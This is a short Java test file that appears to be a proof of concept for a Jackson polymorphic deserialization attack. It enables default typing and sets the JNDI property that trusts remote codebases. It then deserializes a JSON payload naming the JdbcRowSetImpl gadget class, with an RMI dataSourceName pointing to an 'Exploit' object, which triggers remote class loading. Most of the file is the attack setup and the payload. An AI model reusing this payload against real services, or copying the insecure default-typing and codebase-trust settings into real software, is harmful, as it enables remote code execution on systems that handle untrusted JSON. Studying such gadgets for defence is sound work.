package com.jackson;

import java.io.IOException;

import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.MapperFeature;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;
import com.jackson.impl.Apple;
import com.jackson.impl.Banana;

public class Test2 {

	public static void main(String[] args) throws IOException {

		 System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
		 
		Apple apple = new Apple();
		apple.setName("apple");

		Banana banana = new Banana();
		banana.setName("banana");

		Buy buy = new Buy("online", banana);

		ObjectMapper objectMapper = new ObjectMapper();

		//objectMapper.enableDefaultTyping(); // default to using DefaultTyping.OBJECT_AND_NON_CONCRETE
		//objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
		
		
		
		objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);
//		objectMapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);
//		objectMapper.configure(DeserializationFeature.FAIL_ON_INVALID_SUBTYPE, false);
//		objectMapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
//		objectMapper.configure(MapperFeature.PROPAGATE_TRANSIENT_MARKER, true);
		
		String jsonString = objectMapper.writeValueAsString(buy);
        System.out.println("toJSONString : " + jsonString);
        
        String xx = "{\"@class\":\"com.jackson.impl.Banana\",\"name\":\"banana\"}";
        Banana xxx = (Banana) objectMapper.readValue(xx, Object.class);
        System.out.println(xxx.getName());
        //String xx2 = "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1098/Exploit\",\"autoCommit\":true}";
        String xx2 = "{\"@class\":\"com.nqadmin.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1098/Exploit\",\"autoCommit\":true}";
        
        objectMapper.readValue(xx2, Object.class);
	}

}
